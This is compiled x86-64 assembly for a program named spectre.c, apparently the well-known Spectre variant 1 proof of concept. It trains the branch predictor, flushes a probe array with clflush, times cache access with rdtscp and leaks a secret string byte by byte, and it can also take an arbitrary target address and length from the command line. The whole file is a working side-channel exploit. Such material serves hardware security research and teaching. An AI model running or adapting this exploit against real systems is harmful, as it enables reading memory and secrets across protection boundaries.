	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	xorl	%eax, %eax
	cmpq	$15, %rdi
	setbe	%al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.type	victim_function.constprop.0, @function
victim_function.constprop.0:
.LFB5693:
	.cfi_startproc
	movl	x_is_safe_static(%rip), %eax
	testl	%eax, %eax
	je	.L3
	leaq	array1(%rip), %rax
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdi), %eax
	sall	$9, %eax
	cltq
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L3:
	ret
	.cfi_endproc
.LFE5693:
	.size	victim_function.constprop.0, .-victim_function.constprop.0
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	movl	(%rsi), %eax
	testl	%eax, %eax
	je	.L5
	leaq	array1(%rip), %rax
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdi), %eax
	sall	$9, %eax
	cltq
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L5:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	leaq	results.0(%rip), %r9
	movl	$128, %ecx
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	movl	$2863311531, %r14d
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	leaq	array1(%rip), %r12
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	leaq	array2(%rip), %rbx
	leaq	131072(%rbx), %r11
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%r9, %rdi
	leaq	32(%rsp), %r10
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	movl	$999, 4(%rsp)
	rep stosq
.L8:
	leaq	array2(%rip), %rax
	.p2align 4,,10
	.p2align 3
.L9:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%r11, %rax
	jne	.L9
	movl	4(%rsp), %r13d
	movq	8(%rsp), %rcx
	movl	$29, %r8d
	andl	$15, %r13d
	xorq	%r13, %rcx
	.p2align 4,,10
	.p2align 3
.L12:
	movl	%r8d, %eax
	imulq	%r14, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %edx
	movl	%r8d, %eax
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rcx, %rdi
	xorq	%r13, %rdi
	cmpq	$15, %rdi
	ja	.L10
	movl	$1, x_is_safe_static(%rip)
.L10:
	clflush	x_is_safe_static(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L11
.L14:
	call	victim_function.constprop.0
	movl	$0, x_is_safe_static(%rip)
	subl	$1, %r8d
	jnb	.L12
	movl	$13, %esi
	movl	%r8d, %ebp
	.p2align 4,,10
	.p2align 3
.L13:
	movzbl	%sil, %r8d
	movl	%r8d, %r15d
	sall	$9, %r15d
	rdtscp
	movq	%rax, %rdi
	salq	$32, %rdx
	movslq	%r15d, %r15
	movl	%ecx, (%r10)
	orq	%rdx, %rdi
	movzbl	(%rbx,%r15), %eax
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r10)
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$100, %rax
	ja	.L15
	movzbl	(%r12,%r13), %eax
	cmpl	%r8d, %eax
	je	.L15
	addl	$1, (%r9,%r8,4)
.L15:
	addl	$167, %esi
	cmpl	$42765, %esi
	jne	.L13
	movl	(%r9), %esi
	movl	%ebp, %r8d
	movl	$1, %edi
	xorl	%ecx, %ecx
	movl	%esi, %edx
	jmp	.L17
	.p2align 4,,10
	.p2align 3
.L39:
	cmpl	$-1, %r8d
	je	.L22
	movslq	%r8d, %rdx
	cmpl	(%r9,%rdx,4), %eax
	cmovge	%edi, %r8d
.L16:
	movslq	%ecx, %rax
	addq	$1, %rdi
	movl	(%r9,%rax,4), %edx
	cmpq	$256, %rdi
	je	.L38
.L17:
	movl	(%r9,%rdi,4), %eax
	cmpl	%edx, %eax
	jl	.L39
	movl	%ecx, %r8d
	movl	%edi, %ecx
	jmp	.L16
	.p2align 4,,10
	.p2align 3
.L22:
	movl	%edi, %r8d
	jmp	.L16
.L38:
	movslq	%r8d, %rdi
	movl	(%r9,%rdi,4), %ebp
	leal	4(%rbp,%rbp), %r13d
	cmpl	%edx, %r13d
	jl	.L18
	cmpl	$2, %edx
	jne	.L24
	testl	%ebp, %ebp
	je	.L18
.L24:
	subl	$1, 4(%rsp)
	jne	.L8
.L18:
	movq	16(%rsp), %rbx
	xorl	32(%rsp), %esi
	movl	%esi, results.0(%rip)
	movq	24(%rsp), %rsi
	movb	%cl, (%rbx)
	movl	(%r9,%rax,4), %eax
	movl	%eax, (%rsi)
	movb	%r8b, 1(%rbx)
	movl	(%r9,%rdi,4), %eax
	movl	%eax, 4(%rsi)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L40
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L40:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L42:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L60
.L43:
	cmpb	$10, %al
	je	.L42
	cmpb	$105, %al
	jne	.L52
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L43
.L60:
	movq	secret(%rip), %rdx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbx
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 28(%rsp)
	movl	%eax, %r12d
	call	memset@PLT
	cmpl	$3, 4(%rsp)
	je	.L61
.L44:
	xorl	%eax, %eax
	movl	%r12d, %edx
	movl	$1, %edi
	leaq	.LC6(%rip), %rsi
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	js	.L42
	xorl	%ebx, %ebx
	leaq	44(%rsp), %r14
	leaq	.LC7(%rip), %r15
	leaq	54(%rsp), %r13
	leaq	.LC8(%rip), %r12
	.p2align 4,,10
	.p2align 3
.L45:
	movq	secret(%rip), %rax
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movsbl	(%rax,%rbx), %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	movq	%r14, %rdx
	movq	%r13, %rsi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	call	readMemoryByte
	movl	48(%rsp), %ebp
	movl	44(%rsp), %r8d
	movq	%r12, %rsi
	leaq	.LC1(%rip), %rdx
	movl	$1, %edi
	leal	(%rbp,%rbp), %eax
	movl	%r8d, (%rsp)
	cmpl	%eax, %r8d
	leaq	.LC0(%rip), %rax
	cmovge	%rax, %rdx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	movl	(%rsp), %r8d
	movl	$63, %ecx
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	testl	%ebp, %ebp
	jle	.L49
	movzbl	55(%rsp), %edx
	movl	$63, %ecx
	movl	%ebp, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
.L49:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	addq	$1, %rbx
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	testl	%eax, %eax
	jns	.L45
	jmp	.L42
.L52:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L62
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L61:
	.cfi_restore_state
	movq	8(%rsp), %r15
	leaq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	28(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC4(%rip), %rsi
	subq	%rbx, 32(%rsp)
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	28(%rsp), %r12d
	jmp	.L44
.L62:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32